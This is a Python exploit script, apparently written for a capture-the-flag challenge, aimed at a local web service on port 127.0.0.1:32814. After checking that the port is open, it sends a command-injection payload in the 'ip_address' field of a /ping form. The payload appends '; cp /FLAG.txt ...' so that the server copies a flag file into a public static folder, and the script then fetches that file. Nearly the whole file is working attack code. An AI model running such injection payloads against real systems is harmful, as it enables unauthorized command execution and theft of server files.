import socket
import time

print("Testing connectivity to target...")

# Test if port is accessible
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex(('127.0.0.1', 32814))
    sock.close()
    
    if result == 0:
        print("Port 32814 is OPEN")
    else:
        print(f"Port 32814 is CLOSED (error code: {result})")
except Exception as e:
    print(f"Socket test failed: {e}")

print("\nAttempting HTTP requests...")

import requests

try:
    print("POST to /ping...")
    resp1 = requests.post(
        "http://127.0.0.1:32814/ping",
        data={"ip_address": "127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt"},
        timeout=5
    )
    print(f"Success! Status: {resp1.status_code}")
    print(resp1.text)
except requests.exceptions.ConnectionError as e:
    print(f"Connection error: {e}")
except requests.exceptions.Timeout:
    print("Request timed out")
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")

time.sleep(1)

try:
    print("\nGET /static/flag_extracted.txt...")
    resp2 = requests.get("http://127.0.0.1:32814/static/flag_extracted.txt", timeout=5)
    print(f"Success! Status: {resp2.status_code}")
    print(resp2.text)
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")

